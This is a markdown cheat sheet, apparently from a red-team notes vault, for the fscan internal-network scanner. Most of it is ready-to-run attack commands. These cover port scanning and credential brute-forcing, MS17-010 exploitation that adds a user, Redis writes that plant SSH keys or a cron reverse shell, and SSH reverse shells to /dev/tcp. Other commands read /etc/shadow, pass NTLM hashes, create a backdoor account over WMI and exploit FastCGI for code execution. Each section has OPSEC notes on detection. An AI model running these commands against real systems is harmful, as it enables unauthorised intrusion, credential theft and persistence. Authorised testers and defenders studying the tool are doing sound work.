---
title: "fscan"
description: "fscan all-in-one intranet scanner: host/port discovery, service brute-forcing and vuln checks."
category: tools
tags: [scanning, enumeration, internal]
tools: [fscan]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:Tools/fscan.md"
---

# fscan

---

> **Note —** + [fscan](https://github.com/shadow1ng/fscan) Overview
> Comprehensive Go-based internal network scanning framework for penetration testing and red team operations
> 1. Combines host discovery, port scanning, service enumeration, and exploitation in a single binary
> 2. Built-in brute-force modules for SSH, SMB, RDP, FTP, databases (MySQL, MSSQL, PostgreSQL, Redis, Oracle, MongoDB, Memcached)
> 3. Web vulnerability scanning with PoC support (Weblogic, Shiro, Spring, Struts2)
> 4. Exploitation capabilities: MS17-010, Redis write SSH key/cron, FastCGI RCE, SMB pass-the-hash, WMI execution
> 5. Cross-platform (Windows/Linux) with no external dependencies

> **Note —** + Prerequisites
> 6. Network access to target range
> 7. On Linux: raw ICMP requires root or `CAP_NET_RAW` (use `-ping` flag as fallback)
> 8. On Windows: cmd.exe access for ping mode
> 9. Valid credentials or wordlists for brute-force operations
> 10. Latest stable version: v1.8.4 (May 2024); v2.0.0 in development with gRPC/API

> **Note —** + OPSEC Considerations
> 11. **High-noise tool**: generates significant network traffic, logged by firewalls, IDS/IPS, and target systems
> 12. Full TCP handshakes (not SYN-only) logged in connection logs and SIEM
> 13. Brute-force attempts create authentication failures (auth.log, Event ID 4625, fail2ban triggers)
> 14. MS17-010 exploitation can cause blue screens and is detected by all modern EDR
> 15. Command injection vulnerability exists in ICMP module with crafted `-hf` inputs (GitHub issue #392)
> 16. Default Go HTTP User-Agent (`Go-http-client/1.1`) easily fingerprinted
> 17. Output files contain sensitive data (credentials, vulnerabilities); secure or encrypt after use

---

## Host Discovery (ICMP-Based)

> **Note —** + Purpose
> Rapidly identify live hosts on internal networks using ICMP echo requests or command-line ping fallback

```bash
# Linux (raw ICMP, requires root or CAP_NET_RAW)
./fscan -h 192.168.1.0/24

# Windows
fscan.exe -h 192.168.1.0/24

# Command-line ping fallback (no root required on Linux)
./fscan -h 192.168.1.0/24 -ping

# Skip host discovery entirely (proceed to port scanning)
./fscan -h 192.168.1.0/24 -np
```

> **Note —** + Host Discovery Options
> 1. **-h \<target\>**: IP, range (192.168.1.1-255), CIDR (192.168.1.0/24), comma-separated IPs, or /8 (probes .1 and .254 per /16)
> 2. **-hf \<file\>**: Load targets from file (one per line)
> 3. **-hn \<exclude\>**: Exclude hosts/ranges in CIDR notation (e.g., `-hn 192.168.1.1/24`)
> 4. **-ping**: Use OS ping command instead of raw ICMP (safer for non-root, slower)
> 5. **-np**: Skip ICMP/ping entirely; proceed directly to port scanning on all specified IPs
> 6. **-t \<int\>**: Thread count (default 600)
> 7. **-time \<int\>**: Per-host timeout in seconds (default 3)
> 8. **-top \<int\>**: Show top N live B/C segments when scanning /8 ranges (default 10)

```bash
# Standard /24 discovery scan
./fscan -h 10.0.1.0/24

# Large /16 with ICMP, 800 threads
./fscan -h 172.16.0.0/16 -t 800

# /8 gateway/sample discovery (scans .1 and .254 per /16)
./fscan -h 192.0.0.0/8 -m icmp

# From file, exclude management subnet
./fscan -hf targets.txt -hn 10.0.0.0/28

# Skip ICMP for stealth (rely on port probes)
./fscan -h 10.10.10.0/24 -np
```

> **Note —** + Output Interpretation
> 1. **(icmp) Target \<IP\> is alive**: Host responded to ICMP echo or ping
> 2. **[*] Icmp alive hosts len is: N**: Summary of live hosts before port scan phase
> 3. For /8 scans with `-m icmp`: displays top 10 B/C segments by live host count

> **Note —** + OPSEC and Detection Notes
> 4. Raw ICMP is noisy and easily detected by IDS/firewalls (ICMP type 8 echo requests)
> 5. `-ping` uses OS utilities (logged in command history, spawns visible processes on Windows)
> 6. `-np` avoids ICMP entirely but may miss hosts with all ports filtered
> 7. Large thread counts generate traffic bursts visible in [NetFlow](https://en.wikipedia.org/wiki/NetFlow)/traffic analysis
> 8. **Command injection vulnerability** in ICMP module when using `-hf` with crafted IP strings (CVE-like, GitHub issue #392); sanitise inputs or use `-ping` mode (not vulnerable)

> **Note —** + Common Errors
> 9. **bind: operation not permitted** (Linux raw ICMP): run as root or use `-ping`
> 10. **No output**: firewall blocking ICMP outbound/inbound; try `-ping` or `-np`
> 11. **Timeout errors on large ranges**: increase `-time` or reduce `-t` thread count
> 12. **Command injection** (malicious IP file): avoid untrusted `-hf` inputs; use `-ping` for safer mode

---

## Port Scanning

> **Note —** + Purpose
> Comprehensive TCP port enumeration with service banner and fingerprint detection

```bash
# Default ports (21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017)
./fscan -h 192.168.1.0/24

# Specify custom ports
./fscan -h 192.168.1.10 -p 22,80,443,8080

# Port range
./fscan -h 192.168.1.10 -p 1-65535

# Add ports to default list
./fscan -h 192.168.1.0/24 -pa 3389,5900

# Exclude ports from scan
./fscan -h 192.168.1.0/24 -pn 445

# Port groups (v1.8.3+)
./fscan -h 192.168.1.0/24 -p web      # common web ports
./fscan -h 192.168.1.0/24 -p db       # database ports
./fscan -h 192.168.1.0/24 -p service  # common services
```

> **Note —** + Port Scanning Options
> 1. **-p \<spec\>**: Port(s): single (22), list (22,80,3306), range (1-1024), or group (web/db/service/all)
> 2. **-pa \<ports\>**: Add ports to default list
> 3. **-pn \<ports\>**: Exclude ports from scan
> 4. **-portf \<file\>**: Load ports from file
> 5. **-time \<int\>**: TCP connection timeout in seconds (default 3)
> 6. **-np**: Skip ICMP discovery; scan all IPs regardless of ping response
> 7. **-t \<int\>**: Thread count (default 600)

```bash
# Quick web-only scan
./fscan -h 10.0.1.0/24 -p 80,443,8080,8443 -np

# Full port scan, slow and stealthy
./fscan -h 192.168.1.50 -p 1-65535 -t 100 -time 5

# Default + RDP, exclude SMB
./fscan -h 172.16.0.0/16 -pa 3389 -pn 445

# Database-focused scan
./fscan -h 10.10.10.0/24 -p 1433,3306,5432,6379,27017,1521
```

> **Note —** + Output Interpretation
> 1. **\<IP\>:\<port\> open**: TCP handshake succeeded; port is open
> 2. **[*] alive ports len is: N**: Summary before service/vulnerability scanning begins
> 3. Service banners shown inline if retrieved (e.g., SSH-2.0-OpenSSH_7.4)

> **Note —** + OPSEC and Detection Notes
> 4. Full TCP handshake (SYN-SYN/ACK-ACK) logged by firewalls, IDS, and on target (auth.log/Security Event Log)
> 5. High thread counts create connection spikes ([NetFlow](https://en.wikipedia.org/wiki/NetFlow) anomaly)
> 6. Scanning [SMB](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (445), [RDP](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/welcome-to-rds) (3389), or SQL (1433) is high-noise and often alerted
> 7. No SYN-only mode; always completes handshake (noisier than nmap SYN scan)

> **Note —** + Common Errors
> 8. **connection refused**: port closed
> 9. **timeout**: firewall drop or very slow service; increase `-time`
> 10. **too many open files**: reduce `-t` threads or raise OS ulimit

---

## Service Brute-Force

> **Note —** + Purpose
> Password guessing against SSH, SMB, RDP, FTP, Telnet, MySQL, MSSQL, PostgreSQL, Redis, Oracle, MongoDB, Memcached with built-in or custom wordlists

```bash
# Auto-brute discovered services with default wordlists
./fscan -h 192.168.1.0/24

# Skip brute-force entirely
./fscan -h 192.168.1.0/24 -nobr

# Specify single username and password
./fscan -h 192.168.1.0/24 -user admin -pwd password123

# Custom wordlists
./fscan -h 192.168.1.0/24 -userf users.txt -pwdf passwords.txt

# Add single user/password to defaults
./fscan -h 192.168.1.0/24 -usera testuser -pwda testpass

# Brute-force single module only
./fscan -h 192.168.1.50 -m ssh -p 22 -userf users.txt -pwdf passwords.txt
```

> **Note —** + Brute-Force Options
> 1. **-nobr**: Skip all brute-force modules
> 2. **-user \<string\>**: Single username
> 3. **-userf \<file\>**: Username file (one per line)
> 4. **-usera \<string\>**: Add username to default list
> 5. **-pwd \<string\>**: Single password
> 6. **-pwdf \<file\>**: Password file (one per line)
> 7. **-pwda \<string\>**: Add password to default list
> 8. **-br \<int\>**: Brute-force threads per service (default 1; higher = faster but noisier)
> 9. **-domain \<string\>**: SMB domain (for domain-joined accounts)
> 10. **-m \<module\>**: Limit brute to specific service (ssh, smb, rdp, ftp, mssql, mysql, redis, postgresql, oracle, mongodb, memcached)

```bash
# SSH brute with custom list, 3 concurrent attempts per host
./fscan -h 10.0.1.0/24 -m ssh -userf admins.txt -pwdf rockyou-top1000.txt -br 3

# SMB domain brute-force
./fscan -h 192.168.10.0/24 -m smb -domain CORP -user administrator -pwdf passwords.txt

# MySQL single-credential test
./fscan -h 172.16.0.5 -m mysql -user root -pwd toor

# MSSQL with domain authentication
./fscan -h 10.0.1.50 -m mssql -domain CORP -user sa -pwd sa

# PostgreSQL brute-force
./fscan -h 172.16.0.20 -m postgresql -user postgres -pwdf pg_passwords.txt

# Redis check (often no password required)
./fscan -h 192.168.1.0/24 -m redis
```

> **Note —** + Output Interpretation
> 1. **[+] ssh 192.168.1.10:22:root password**: Successful authentication
> 2. **[-] ssh 192.168.1.10:22 root:admin Login failed**: Failed attempt
> 3. Successful credentials summarised at end and saved to output file (default `result.txt`)

> **Note —** + OPSEC and Detection Notes
> 4. **High noise**: failed authentication attempts logged (auth.log, Event ID 4625, syslog)
> 5. Default brute thread = 1 per service (slow but less likely to trigger lockout)
> 6. Increasing `-br` risks account lockouts and IDS/IPS threshold alerts
> 7. [SMB](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) brute generates [NTLM](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) authentication traffic (highly visible to domain controllers and SIEM)
> 8. [RDP](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/welcome-to-rds) brute can trigger Windows account lockout policies (default 5 failed attempts)
> 9. Services like Redis/Memcached with no authentication are probed without brute-force
> 10. Database logs capture failed authentication (MySQL general/error log, MSSQL error log, PostgreSQL pg_log)
> 11. High-value targets; database brute-force often triggers SOC alerts

> **Note —** + Common Errors
> 12. **connection reset**: rate-limiting or ban (e.g., fail2ban)
> 13. **account locked out**: reduce `-br` threads, use smaller wordlists
> 14. **authentication failed** (all attempts): credentials incorrect or account disabled
> 15. **timeout**: service overloaded or firewall drop
> 16. **access denied** (databases): wrong credentials or host-based ACLs (e.g., MySQL bind-address)

---

## NetBIOS and SMB Enumeration

> **Note —** + Purpose
> Discover Windows hosts, workgroup/domain membership, hostnames, identify [domain controllers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)

```bash
# Auto NetBIOS discovery during full scan
./fscan -h 192.168.1.0/24

# NetBIOS-only mode (full detail)
./fscan -h 192.168.1.0/24 -m netbios

# With SMB credentials for authenticated enumeration
./fscan -h 192.168.1.0/24 -m smb -user administrator -pwd password
```

> **Note —** + NetBIOS/SMB Options
> 1. **-m netbios**: Show verbose NetBIOS info (hostname, workgroup/domain, MAC, user)
> 2. **-m smb**: SMB brute/enumeration; requires `-user` and `-pwd` for authenticated access
> 3. **-domain \<string\>**: Specify domain for SMB authentication
> 4. **-pn 445**: Skip SMB entirely (to avoid noisy SMB scanning)

```bash
# Quick NetBIOS scan for domain controllers
./fscan -h 10.0.0.0/16 -m netbios -p 139

# SMB authenticated enumeration
./fscan -h 192.168.10.0/24 -m smb -domain CORP -user administrator -pwd P@ssw0rd

# Skip SMB ports entirely
./fscan -h 172.16.0.0/16 -pn 445,139
```

> **Note —** + Output Interpretation
> 1. **[*] NetBios 192.168.1.10 WORKGROUP\\HOSTNAME**: Workgroup member
> 2. **[+] DC 192.168.1.10 DOMAIN\\HOSTNAME**: Domain controller (DC flag)
> 3. `-m netbios` shows full table: hostname, workgroup/domain, MAC, logged-in user (if available)

> **Note —** + OPSEC and Detection Notes
> 4. NetBIOS queries (UDP 137, TCP 139) are low-noise but logged by domain controllers
> 5. [SMB](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (TCP 445) authenticated enumeration generates Windows Event ID 4624/4625, highly visible in SIEM
> 6. Domain controller identification is sensitive; enumerating DCs alerts domain administrators
> 7. Anonymous SMB enumeration often blocked (modern Windows); requires valid credentials

> **Note —** + Common Errors
> 8. **access denied**: SMB signing required, wrong credentials, or anonymous enumeration blocked
> 9. **connection refused**: SMB disabled or firewall
> 10. **timeout**: network latency; increase `-time`

---

## MS17-010 Detection and Exploitation

> **Note —** + [MS17-010](https://en.wikipedia.org/wiki/EternalBlue) (EternalBlue) Overview
> Critical SMB vulnerability affecting Windows XP–2008R2, unpatched Windows 7/2008 systems

> **Note —** + Critical Warning
> 1. **Extremely noisy**: MS17-010 exploit causes SMB crashes (blue screen potential)
> 2. Detected by all modern EDR/IDS/IPS systems
> 3. Exploitation = system-level compromise with high-integrity logs (Event ID 4688, 4672)
> 4. **Only use on authorised lab/pentest environments**
> 5. Some antivirus/EDR block or quarantine fscan.exe due to MS17-010 module

```bash
# Auto-detect MS17-010 during full scan
./fscan -h 192.168.1.0/24

# MS17-010 detection only
./fscan -h 192.168.1.0/24 -m ms17010

# Exploit with built-in shellcode (add user)
./fscan -h 192.168.1.50 -m ms17010 -sc add
```

> **Note —** + MS17-010 Options
> 1. **-m ms17010**: Enable MS17-010 module
> 2. **-sc \<type\>**: Shellcode action; `add` = add user (hardcoded in source; customise in `ms17010-exp.go`)
> 3. Custom shellcode: edit `Plugins/ms17010-exp.go` before compiling

```bash
# Scan /16 for vulnerable hosts
./fscan -h 10.0.0.0/16 -m ms17010 -np

# Exploit single host, add user
./fscan -h 192.168.1.75 -m ms17010 -sc add

# Detection only (no exploitation)
./fscan -h 172.16.0.0/24 -m ms17010
```

> **Note —** + Output Interpretation
> 1. **[+] MS17-010 192.168.1.50 (Windows 7 Professional 7601 Service Pack 1)**: Vulnerable
> 2. **[*] MS17-010 Exploit success**: Shellcode executed (if `-sc` used)
> 3. **[-] MS17-010 192.168.1.10 Not vulnerable**: Patched or non-vulnerable OS

> **Note —** + Exploitation Notes
> 4. Built-in shellcode (`-sc add`) adds user `fscan`/`fscan123` (customise in source before compiling)
> 5. Prefer external tools ([Metasploit](https://www.metasploit.com/) `exploit/windows/smb/ms17_010_eternalblue`) for stable exploitation
> 6. MS17-010 module uses DoublePulsar-like technique; unreliable on production systems

> **Note —** + Common Errors
> 7. **Not vulnerable**: host patched, non-vulnerable OS (Windows 10+, Server 2012+), or SMB disabled
> 8. **Exploit failed**: target unstable, incorrect shellcode, or EDR blocked
> 9. **Blue screen/crash**: target system unstable; MS17-010 exploit is inherently risky

---

## Web Fingerprinting and Title Extraction

> **Note —** + Purpose
> Identify web frameworks, CMS, OA systems, and extract HTTP titles for situational awareness

```bash
# Auto web fingerprint during full scan
./fscan -h 192.168.1.0/24

# Scan specific URL
./fscan -u http://192.168.1.50:8080

# Scan URLs from file
./fscan -uf urls.txt

# Skip web scanning
./fscan -h 192.168.1.0/24 -nopoc
```

> **Note —** + Web Fingerprinting Options
> 1. **-u \<url\>**: Single URL (v1.8.1+ supports comma-separated URLs)
> 2. **-uf \<file\>**: URL file (one per line)
> 3. **-nopoc**: Skip web vulnerability/fingerprint scanning
> 4. **-wt \<int\>**: Web request timeout in seconds (default 5)
> 5. **-proxy \<url\>**: HTTP proxy for web requests (e.g., `-proxy http://127.0.0.1:8080`)
> 6. **-cookie \<string\>**: Set cookies (e.g., `-cookie "session=abc123"`)

```bash
# Scan /24 for web services
./fscan -h 10.0.1.0/24 -p 80,443,8080,8443

# Single URL with proxy (Burp Suite)
./fscan -u https://192.168.1.100 -proxy http://127.0.0.1:8080

# URL file with extended timeout
./fscan -uf web_targets.txt -wt 10

# Fast scan, skip PoC and fingerprinting
./fscan -h 172.16.0.0/16 -nopoc -nobr
```

> **Note —** + Output Interpretation
> 1. **[*] WebTitle http://192.168.1.10:80 code:200 len:1234 title:Apache Test Page**: HTTP status, content length, page title
> 2. **[*] http://192.168.1.50:8080 [Tomcat]**: Framework/CMS fingerprint detected

> **Note —** + OPSEC and Detection Notes
> 1. HTTP requests logged in web server access logs (Apache access.log, IIS logs, nginx access.log)
> 2. User-Agent string default is Go HTTP client (easily fingerprinted; not customisable in fscan)
> 3. Requests to common paths (e.g., `/favicon.ico`, CMS-specific paths) may trigger WAF/IDS
> 4. Low-noise activity unless combined with PoC scanning
> 5. TLS 1.0+ supported (TLS 1.0 minimum set in v1.8.3)

> **Note —** + Common Errors
> 6. **timeout**: slow server or network; increase `-wt`
> 7. **connection refused**: service down or firewall
> 8. **SSL handshake failed**: certificate issues; fscan accepts invalid certificates by default

---

## Web Vulnerability Scanning (PoC/xray)

> **Note —** + Purpose
> Detect web vulnerabilities using built-in PoCs and [xray](https://github.com/chaitin/xray)-compatible PoC files (Weblogic, Shiro, Spring, Struts2, etc.)

```bash
# Auto PoC scan during full scan
./fscan -h 192.168.1.0/24

# PoC scan single URL
./fscan -u http://192.168.1.50:7001

# Use custom PoC directory
./fscan -u http://target.local -pocpath ./custom_pocs/

# Filter PoCs by name
./fscan -u http://target.local -pocname weblogic

# Skip PoC scanning
./fscan -h 192.168.1.0/24 -nopoc

# Full Shiro key brute (100 keys instead of 10)
./fscan -u http://192.168.1.50:8080 -full
```

> **Note —** + PoC Scanning Options
> 1. **-nopoc**: Skip all web PoC scanning
> 2. **-pocpath \<dir\>**: Directory with custom xray-format PoC YAML files
> 3. **-pocname \<string\>**: Fuzzy match PoC name (e.g., `weblogic`, `shiro`, `spring`)
> 4. **-full**: Run exhaustive PoC scans (e.g., [Shiro](https://shiro.apache.org/) 100 keys instead of default 10; backup file fuzzing)
> 5. **-dns**: Enable DNS log-based PoCs (requires external DNS log service; not built-in)
> 6. **-num \<int\>**: PoC request rate/concurrency (default 20)
> 7. **-proxy \<url\>**: HTTP proxy for PoC requests
> 8. **-cookie \<string\>**: Custom cookies for PoC requests

```bash
# Weblogic CVE scan
./fscan -u http://10.0.1.50:7001 -pocname weblogic

# Shiro full key brute (100 keys)
./fscan -u http://192.168.1.100:8080 -pocname shiro -full

# Scan with xray PoCs via Burp proxy
./fscan -u http://target.local -pocpath /opt/xray/pocs/ -proxy http://127.0.0.1:8080

# Skip PoC, web fingerprint only
./fscan -h 172.16.0.0/24 -nopoc
```

> **Note —** + Built-in PoC Coverage
> 1. [Weblogic](https://www.oracle.com/middleware/technologies/weblogic.html) (multiple CVEs)
> 2. [Apache Shiro](https://shiro.apache.org/) (default 10 keys; 100 with `-full`)
> 3. [Spring Framework](https://spring.io/) (CVE-2021-21234, CVE-2022-22965, etc.)
> 4. [Struts2](https://struts.apache.org/) (multiple CVEs)
> 5. [ThinkPHP](http://www.thinkphp.cn/) vulnerabilities
> 6. Custom xray-compatible PoCs (partial compatibility)

> **Note —** + Output Interpretation
> 1. **[+] PoC-2021-12345 http://192.168.1.50:7001**: Vulnerability detected (PoC name, URL)
> 2. No output = no vulnerabilities detected (or `-nopoc` used)

> **Note —** + OPSEC and Detection Notes
> 1. **High noise**: exploitation attempts logged in web/application logs, WAF, IDS/IPS
> 2. Payload strings (e.g., `{{7*7}}`, JNDI URLs) trigger WAF signatures
> 3. `-full` mode sends many requests (Shiro 100 keys = 100+ requests); rate-limits or bans likely
> 4. DNS log PoCs require external service (e.g., [Ceye](http://ceye.io/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)); not stealthy
> 5. Some PoCs attempt command execution (whoami, DNS lookups); logged as suspicious activity

> **Note —** + Common Errors
> 6. **timeout**: slow application or network; increase `-wt`
> 7. **WAF block**: 403/429 responses; reduce `-num`, use `-proxy`, or abandon
> 8. **PoC failed**: target not vulnerable, PoC outdated, or environmental issue
> 9. Xray PoC incompatibility: some xray v2 PoCs unsupported; verify fscan version and PoC format

---

## Redis Exploitation

> **Note —** + Purpose
> Exploit unauthenticated or authenticated [Redis](https://redis.io/) to write SSH public key or cron reverse shell

> **Note —** + Prerequisites
> 1. Redis (port 6379) open and writable
> 2. Target Linux system with Redis running as user with SSH or cron access
> 3. Modern Redis often requires authentication; unauthenticated instances rare but high-value

```bash
# Auto-detect Redis during scan (shows unauthorised status)
./fscan -h 192.168.1.0/24

# Write SSH public key to target
./fscan -h 192.168.1.50 -m redis -rf id_rsa.pub

# Write cron reverse shell
./fscan -h 192.168.1.50 -m redis -rs 192.168.1.100:4444

# Skip Redis exploitation
./fscan -h 192.168.1.0/24 -noredis
```

> **Note —** + Redis Exploitation Options
> 1. **-m redis**: Redis module (detection + exploitation if `-rf` or `-rs` used)
> 2. **-rf \<file\>**: SSH public key file to write to `~/.ssh/authorized_keys`
> 3. **-rs \<IP:port\>**: Attacker IP:port for reverse shell via cron (e.g., `-rs 10.0.1.5:6666`)
> 4. **-noredis**: Skip Redis security tests (detection only, no exploitation)
> 5. **-pwd \<string\>**: Redis password (if authentication enabled)

```bash
# Generate SSH key, write to Redis target
ssh-keygen -t rsa -f fscan_key
./fscan -h 10.0.1.75 -m redis -rf fscan_key.pub
ssh -i fscan_key redis@10.0.1.75

# Cron reverse shell exploitation
nc -lvnp 4444  # listener on attacker machine
./fscan -h 192.168.1.50 -m redis -rs 192.168.1.100:4444

# Authenticated Redis exploitation
./fscan -h 172.16.0.10 -m redis -pwd foobared -rf id_rsa.pub
```

> **Note —** + Output Interpretation
> 1. **[+] Redis 192.168.1.50:6379 unauthorized file:/var/lib/redis/dump.rdb**: No authentication, writable, file path disclosed
> 2. **[+] Redis 192.168.1.50 Write SSH Key Success**: SSH key written to `authorized_keys`
> 3. **[+] Redis 192.168.1.50 Write Cron Success**: Cron job created for reverse shell

> **Note —** + Exploitation Technique Notes
> 4. Targets Linux only (SSH key / cron paths hardcoded for Linux)
> 5. Redis exploitation removed from default scan in some versions; use `-m redis` explicitly
> 6. Cron reverse shell format: `*/1 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`

> **Note —** + OPSEC and Detection Notes
> 7. **High noise**: writing files/cron jobs creates forensic artefacts (`authorized_keys`, `/var/spool/cron`)
> 8. Redis logs (`redis.log`) capture commands (`CONFIG SET`, `SET`, `SAVE`)
> 9. Cron reverse shell spawns network connection (logged in NetFlow, firewall, and process logs)
> 10. SSH key persistence obvious in `~/.ssh/authorized_keys`

> **Note —** + Common Errors
> 11. **NOAUTH Authentication required**: Redis password set; use `-pwd` or skip
> 12. **Permission denied**: Redis user lacks write access to `/root/.ssh/` or `/var/spool/cron`
> 13. **CONFIG SET failed**: Redis `config` command disabled (common hardening)
> 14. Cron not triggered: cron daemon not running, or syntax error in cron entry

---

## SSH Command Execution (Post-Exploit)

> **Note —** + Purpose
> Execute commands on SSH targets after successful brute-force or using known credentials/SSH key

```bash
# Execute command after successful SSH brute
./fscan -h 192.168.1.0/24 -m ssh -c "whoami; id"

# Use SSH private key + command
./fscan -h 192.168.1.50 -m ssh -sshkey id_rsa -user root -c "uname -a"

# Brute + command on custom port
./fscan -h 10.0.1.0/24 -m ssh -p 2222 -c "cat /etc/passwd"
```

> **Note —** + SSH Command Execution Options
> 1. **-c \<string\>**: Command to execute (semicolon-separated for multiple commands)
> 2. **-sshkey \<file\>**: SSH private key file (e.g., `id_rsa`)
> 3. **-user \<string\>**: Username (required with `-sshkey`)
> 4. **-m ssh**: SSH module
> 5. **-p \<port\>**: Custom SSH port

```bash
# Post-exploit enumeration
./fscan -h 192.168.1.75 -m ssh -user admin -pwd admin -c "whoami; hostname; ip a"

# SSH key-based command execution
./fscan -h 10.0.1.100 -m ssh -sshkey ~/.ssh/pentest_key -user root -c "cat /etc/shadow"

# Reverse shell
./fscan -h 192.168.1.50 -m ssh -user admin -pwd admin -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
```

> **Note —** + Output Interpretation
> 1. **[+] SSH 192.168.1.50:22:root password**: Credentials valid
> 2. Command output printed inline (stdout from SSH session)

> **Note —** + OPSEC and Detection Notes
> 1. SSH logins logged (`auth.log`, `/var/log/secure`, Event Logs on some systems)
> 2. Command execution visible in shell history (`.bash_history`, `.zsh_history`) unless overridden
> 3. Processes spawned by commands visible in `ps`, `/proc`, and EDR telemetry
> 4. Network connections from reverse shells logged in NetFlow, firewall, and process network logs
> 5. Low-noise login (SSH key-based) preferred over brute-force

> **Note —** + Technical Notes
> 6. SSH key support added in v1.6.2
> 7. Commands executed in non-interactive shell; some commands requiring TTY may fail
> 8. Workaround for TTY requirements: `python -c 'import pty; pty.spawn("/bin/bash")'`

> **Note —** + Common Errors
> 9. **Permission denied (publickey)**: SSH key not accepted; use password authentication (`-pwd`)
> 10. **timeout**: network latency or SSH tarpit; increase `-time`
> 11. Command failed: syntax error, missing binary, or insufficient privileges

---

## SMB Pass-the-Hash and WMIExec

> **Note —** + Purpose
> Lateral movement via SMB using [NTLM hash](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) (pass-the-hash) or remote command execution via [WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (no output)

```bash
# SMB pass-the-hash
./fscan -h 192.168.1.0/24 -m smb2 -user administrator -hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# WMI command execution (no echo)
./fscan -h 192.168.1.50 -m wmiexec -user administrator -pwd Password1 -c "whoami"

# WMI with hash
./fscan -h 192.168.1.50 -m wmiexec -user administrator -hash <NTLM_hash> -c "net user fscan fscan123 /add"
```

> **Note —** + Pass-the-Hash Options
> 1. **-m smb2**: SMB pass-the-hash module
> 2. **-m wmiexec**: WMI remote execution (no output returned)
> 3. **-hash \<string\>**: NTLM hash (LM:NTLM or NTLM-only; LM can be `aad3b435b51404eeaad3b435b51404ee` for modern hashes)
> 4. **-user \<string\>**: Username
> 5. **-pwd \<string\>**: Password (for WMI without hash)
> 6. **-c \<string\>**: Command to execute (WMI only)
> 7. **-domain \<string\>**: Domain (optional, for domain accounts)
> 8. **-wmi**: Enable WMI scanning (auto-enabled with `-m wmiexec`)

```bash
# Pass-the-hash SMB authentication test
./fscan -h 10.0.1.0/24 -m smb2 -user admin -hash 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1

# WMI command execution (blind)
./fscan -h 192.168.1.100 -m wmiexec -user administrator -pwd P@ssw0rd -c "powershell -enc <base64_payload>"

# Domain pass-the-hash
./fscan -h 172.16.0.50 -m smb2 -domain CORP -user Administrator -hash <hash>
```

> **Note —** + Output Interpretation
> 1. **[+] SMB 192.168.1.50:445 administrator \<hash\>**: Pass-the-hash succeeded
> 2. **[+] WMIExec 192.168.1.50 Success**: Command sent (no output returned; verify via other means)

> **Note —** + OPSEC and Detection Notes
> 1. **High noise**: [NTLM](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) authentication logged (Event ID 4624 type 3, 4776); pass-the-hash is a known attack pattern
> 2. WMI execution creates process (Event ID 4688, Sysmon Event ID 1) and WMI activity (Event ID 5857–5861)
> 3. No command output returned by WMI module; blind execution only
> 4. Pass-the-hash detected by modern EDR and Windows Defender Credential Guard (if enabled)

> **Note —** + Technical Notes
> 1. Pass-the-hash (`-m smb2`) added in v1.8.2
> 2. WMI no-echo execution (`-m wmiexec`) added in v1.8.2
> 3. LM hash optional; modern Windows uses NTLM-only
> 4. WMI execution less reliable than SSH; prefer authenticated SMB enumeration or [Impacket](https://github.com/fortra/impacket) wmiexec.py

> **Note —** + Common Errors
> 1. **Access denied**: wrong hash, user lacks administrator rights, or Credential Guard enabled
> 2. **timeout**: SMB/WMI service unavailable or firewall
> 3. WMI command failed silently: verify command syntax, check target logs

---

## FastCGI Exploitation

> **Note —** + Purpose
> Detect and exploit [FastCGI](https://en.wikipedia.org/wiki/FastCGI) (PHP-FPM) misconfiguration to execute arbitrary code

```bash
# Auto FastCGI scan during full scan
./fscan -h 192.168.1.0/24

# Target specific FastCGI port
./fscan -h 192.168.1.50 -p 9000

# Specify remote file path (optional)
./fscan -h 192.168.1.50 -path /var/www/html/index.php
```

> **Note —** + FastCGI Options
> 1. **-path \<string\>**: Remote file path for FastCGI exploit (default tries common paths)
> 2. No dedicated `-m fcgi` module; auto-detected when port 9000 (or custom) is scanned

```bash
# Scan /24 for exposed FastCGI
./fscan -h 10.0.1.0/24 -p 9000

# Exploit with custom path
./fscan -h 192.168.1.75 -p 9000 -path /usr/share/nginx/html/info.php
```

> **Note —** + Output Interpretation
> 1. **[+] FastCGI 192.168.1.50:9000 RCE**: Vulnerable to remote code execution
> 2. Command output or error message may be displayed inline

> **Note —** + OPSEC and Detection Notes
> 1. FastCGI exploitation logged in PHP-FPM logs, web server logs, and system logs
> 2. RCE attempts highly visible; spawned processes logged
> 3. Exposed FastCGI (port 9000 public) is severe misconfiguration; uncommon but high-value

> **Note —** + Technical Notes
> 4. FastCGI module added in v1.6.2
> 5. Primarily targets PHP-FPM; other FastCGI implementations less tested

> **Note —** + Common Errors
> 6. **Connection refused**: FastCGI not exposed or firewall
> 7. **File not found**: specified `-path` does not exist on target
> 8. Exploit failed: FastCGI version or configuration not vulnerable

---

## Output and Reporting

> **Note —** + Purpose
> Save scan results to file (text, JSON); control output verbosity and format

```bash
# Default output to result.txt
./fscan -h 192.168.1.0/24

# Custom output file
./fscan -h 192.168.1.0/24 -o /tmp/scan_results.txt

# JSON output
./fscan -h 192.168.1.0/24 -o results.json -json

# No file output (stdout only)
./fscan -h 192.168.1.0/24 -no

# Silent scan (minimal stdout)
./fscan -h 192.168.1.0/24 -silent

# No color output
./fscan -h 192.168.1.0/24 -nocolor
```

> **Note —** + Output Options
> 1. **-o \<file\>**: Output file path (default `result.txt`)
> 2. **-no**: Do not save output to file
> 3. **-json**: Output in JSON format (v1.8.3+)
> 4. **-silent**: Suppress most stdout (for Cobalt Strike/automation; results still saved unless `-no`)
